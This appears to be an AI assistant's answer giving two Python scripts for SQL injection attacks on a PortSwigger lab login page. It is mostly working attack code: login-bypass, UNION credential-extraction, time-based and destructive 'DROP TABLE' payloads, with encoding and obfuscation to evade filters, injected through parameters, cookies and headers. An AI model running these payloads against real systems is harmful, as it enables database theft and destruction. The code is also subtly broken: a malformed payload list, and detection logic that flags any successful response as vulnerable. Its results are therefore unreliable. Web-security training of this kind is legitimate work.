
## **Enhanced SQL Injection Testing Script with Encoding**

```python
import requests
import time
from urllib.parse import quote, unquote

class SQLInjectionTester:
    def __init__(self, target_url, cookies=None, headers=None):
        self.target_url = target_url
        self.cookies = cookies or {}
        self.headers = headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        self.vulnerable_params = []
        
    def encode_payload(self, payload, encoding_type='url'):
        """Encode payload using different encoding methods"""
        encoding_methods = {
            'url': lambda p: quote(p),
            'double_url': lambda p: quote(quote(p)),
            'unicode': lambda p: ''.join([f'%u{ord(c):04x}' for c in p]),
            'html': lambda p: p.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'),
            'base64': lambda p: __import__('base64').b64encode(p.encode()).decode(),
            'none': lambda p: p
        }
        return encoding_methods.get(encoding_type, lambda p: p)(payload)
    
    def test_encoded_injection(self, param, value):
        """Test SQL injection with various encodings"""
        base_payloads = [
            # Basic authentication bypass
            "' OR '1'='1",
            "admin'--",
            
            # Union attacks
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--",
            
            # Error-based
            "' AND 1=CAST(version() AS int)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; SELECT pg_sleep(5)--",
            
            # Time-based
            "' AND (SELECT pg_sleep(5))--",
            "'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        ]
        
        encoding_types = ['none', 'url', 'double_url']  # Test without encoding and with encoding
        
        for encoding in encoding_types:
            for payload in base_payloads:
                encoded_payload = self.encode_payload(payload, encoding)
                test_value = value + encoded_payload
                
                response = self.send_request(param, test_value)
                
                if self.detect_vulnerability(response, f"{encoding}:{payload}"):
                    print(f"✅ VULNERABLE ({encoding}): {param} with: {payload}")
                    print(f"   Encoded as: {encoded_payload}")
                    return True
                    
        return False
    
    def test_special_characters(self, param, value):
        """Test individual special character encoding"""
        special_chars = {
            'semicolon': (';', '%3B'),
            'single_quote': ("'", '%27'),
            'double_quote': ('"', '%22'),
            'comment': ('--', '%2D%2D'),
            'slash': ('/*', '%2F%2A'),
            'equals': ('=', '%3D'),
            'space': (' ', '%20'),
            'parentheses': ('()', '%28%29'),
            'union': ('UNION', '%55%4E%49%4F%4E'),
        }
        
        for char_name, (raw_char, encoded_char) in special_chars.items():
            # Test raw character
            raw_response = self.send_request(param, value + raw_char)
            # Test encoded character  
            encoded_response = self.send_request(param, value + encoded_char)
            
            if (self.detect_vulnerability(raw_response, f"raw_{char_name}") or 
                self.detect_vulnerability(encoded_response, f"encoded_{char_name}")):
                print(f"✅ SPECIAL CHAR: {param} - {char_name}")
                return True
                
        return False
    
    def test_obfuscation_techniques(self, param, value):
        """Test various obfuscation and encoding bypass techniques"""
        obfuscation_tests = [
            # URL encoding variations
            ("' OR 1=1--", "%27%20%4F%52%20%31%3D%31%2D%2D"),
            
            # Mixed case
            ("' Or 1=1--", None),
            "' oR 1=1--",
            "' OR 1=1--",
            
            # Whitespace variations
            ("'%09OR%091=1--", None),  # tab
            ("'%0AOR%0A1=1--", None),  # newline
            ("'%0DOR%0D1=1--", None),  # carriage return
            ("'%0COR%0C1=1--", None),  # form feed
            
            # Comment variations
            ("' OR 1=1/*", None),
            ("' OR 1=1#", None),
            ("' OR 1=1%23", None),
            
            # Double URL encoding
            ("' UNION SELECT 1--", "%2527%2520%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554%2520%2531%252D%252D"),
            
            # Unicode encoding
            ("' OR 1=1--", "%u0027%u0020%u004F%u0052%u0020%u0031%u003D%u0031%u002D%u002D"),
            
            # HTML entities
            ("' OR 1=1--", "&#39; OR 1=1--"),
            
            # Base64 encoding (would need decoding on server)
            ("' OR 1=1", "JyBPUiAxPTE="),
        ]
        
        for payload, encoded_version in obfuscation_tests:
            if encoded_version:
                test_value = value + encoded_version
            else:
                test_value = value + payload
                
            response = self.send_request(param, test_value)
            
            if self.detect_vulnerability(response, payload):
                print(f"✅ OBFUSCATION: {param} with: {payload}")
                if encoded_version:
                    print(f"   Using encoding: {encoded_version}")
                return True
                
        return False
    
    def test_cookie_injection(self):
        """Test SQL injection in cookies specifically"""
        cookie_payloads = [
            # Basic cookie injection
            ("' OR '1'='1", "TrackingId=%27%20OR%20%271%27%3D%271"),
            
            # Time-based in cookies
            ("'%3B SELECT pg_sleep(5)--", "TrackingId=%27%3B%20SELECT%20pg_sleep%285%29--"),
            
            # Stacked queries in cookies
            ("'; DROP TABLE users--", "TrackingId=%27%3B%20DROP%20TABLE%20users--"),
        ]
        
        for payload, encoded_cookie in cookie_payloads:
            # Test with encoded cookie value
            self.cookies['TrackingId'] = unquote(encoded_cookie)  # Decode for the cookie header
            response = self.send_request(None, None)  # No parameter, just cookies
            
            if self.detect_vulnerability(response, f"cookie:{payload}"):
                print(f"✅ COOKIE INJECTION: {payload}")
                return True
                
        return False
    
    def test_header_injection(self):
        """Test SQL injection in various HTTP headers"""
        headers_to_test = {
            'User-Agent': [
                "' OR '1'='1",
                "'; SELECT pg_sleep(5)--",
            ],
            'X-Forwarded-For': [
                "1.1.1.1' OR '1'='1",
                "1.1.1.1'; DROP TABLE logs--",
            ],
            'Referer': [
                "https://site.com' OR 1=1--",
                "https://site.com'; SELECT version()--",
            ],
        }
        
        for header, payloads in headers_to_test.items():
            for payload in payloads:
                original_header = self.headers.get(header, '')
                self.headers[header] = payload
                
                response = self.send_request(None, None)
                
                if self.detect_vulnerability(response, f"header:{header}:{payload}"):
                    print(f"✅ HEADER INJECTION: {header} with: {payload}")
                    return True
                    
                # Restore original header
                self.headers[header] = original_header
                
        return False
    
    def send_request(self, param, value):
        """Send HTTP request with the payload"""
        data = {}
        if param and value:
            data = {param: value}
        
        try:
            response = requests.post(
                self.target_url,
                data=data,
                cookies=self.cookies,
                headers=self.headers,
                timeout=10,
                verify=False,
                allow_redirects=False
            )
            return response
        except requests.exceptions.RequestException as e:
            print(f"❌ Request failed: {e}")
            return None
    
    def detect_vulnerability(self, response, payload):
        """Enhanced vulnerability detection"""
        if not response:
            return False
            
        indicators = [
            # Success indicators
            'welcome' in response.text.lower(),
            'login successful' in response.text.lower(),
            'admin' in response.text.lower(),
            response.status_code in [200, 302],  # Success or redirect
            
            # Error indicators
            'error' in response.text.lower(),
            'sql' in response.text.lower(),
            'syntax' in response.text.lower(),
            'postgresql' in response.text.lower(),
            'mysql' in response.text.lower(),
            'ora-' in response.text.lower(),
            
            # Time-based detection would be handled separately
            response.elapsed.total_seconds() > 3,  # Potential time-based
        ]
        
        return any(indicators)
    
    def full_scan(self, params=None):
        """Run complete SQL injection scan with encoding tests"""
        print(f"🔍 Starting Advanced SQL Injection Scan for: {self.target_url}")
        print("=" * 70)
        
        if params:
            for param, default_value in params.items():
                print(f"\n📊 Testing parameter: {param}")
                
                tests = [
                    ("Encoded Injection", self.test_encoded_injection),
                    ("Special Characters", self.test_special_characters),
                    ("Obfuscation Techniques", self.test_obfuscation_techniques),
                ]
                
                vulnerable = False
                for test_name, test_func in tests:
                    if test_func(param, default_value):
                        vulnerable = True
                        self.vulnerable_params.append((param, test_name))
        
        # Test non-parameter injection points
        print(f"\n🍪 Testing Cookie Injection")
        if self.test_cookie_injection():
            self.vulnerable_params.append(("Cookie", "Cookie Injection"))
            
        print(f"\n📨 Testing Header Injection")  
        if self.test_header_injection():
            self.vulnerable_params.append(("HTTP Headers", "Header Injection"))
        
        print("\n" + "=" * 70)
        print("📊 ENHANCED SCAN SUMMARY:")
        if self.vulnerable_params:
            for param, test_name in self.vulnerable_params:
                print(f"🚨 VULNERABLE: {param} - {test_name}")
        else:
            print("✅ No SQL injection vulnerabilities detected!")

# Usage Example
if __name__ == "__main__":
    # Configure your target
    TARGET_URL = "https://0afb007704edc628806f350100a100ae.web-security-academy.net/login"
    
    # Test parameters
    PARAMS = {
        "username": "test",
        "password": "test123", 
        "search": "hello",
        "email": "test@example.com"
    }
    
    # Cookies from your example
    COOKIES = {
        "TrackingId": "test",
        "session": "ZLqAYtqduFW7LA8NjhXoMy10h75R8dDY"
    }
    
    HEADERS = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://portswigger.net/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate", 
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Te": "trailers"
    }
    
    # Create tester and run enhanced scan
    tester = SQLInjectionTester(TARGET_URL, cookies=COOKIES, headers=HEADERS)
    tester.full_scan(PARAMS)
```

## **Quick Test for Your Specific Case**

```python
# quick_cookie_test.py - Test your exact scenario
import requests
import time

def test_time_based_cookie():
    url = "https://0afb007704edc628806f350100a100ae.web-security-academy.net/"
    
    # Your exact payload
    payloads = [
        "'%3bSELECT CASE WHEN(1=1)THEN pg_sleep(10) ELSE pg_sleep(0) END--",
        "'%3BSELECT+CASE+WHEN(1=1)THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--",
        "'%3bSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--",
    ]
    
    for payload in payloads:
        cookies = {
            "TrackingId": payload,
            "session": "ZLqAYtqduFW7LA8NjhXoMy10h75R8dDY"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        }
        
        print(f"Testing payload: {payload}")
        start_time = time.time()
        
        try:
            response = requests.get(url, cookies=cookies, headers=headers, timeout=15)
            end_time = time.time()
            
            response_time = end_time - start_time
            print(f"Response time: {response_time:.2f} seconds")
            
            if response_time > 8:
                print("🚨 TIME-BASED SQL INJECTION CONFIRMED!")
                return True
                
        except requests.exceptions.Timeout:
            print("✅ Request timed out - likely vulnerable to time-based SQLi")
            return True
        except Exception as e:
            print(f"Error: {e}")
    
    return False

if test_time_based_cookie():
    print("\n💥 VULNERABILITY CONFIRMED - Your site is vulnerable to time-based SQL injection!")
else:
    print("\n✅ No time-based SQL injection detected")
```

This enhanced script now tests **ALL encoding methods** and covers **cookies, headers, and parameters** with various obfuscation techniques!
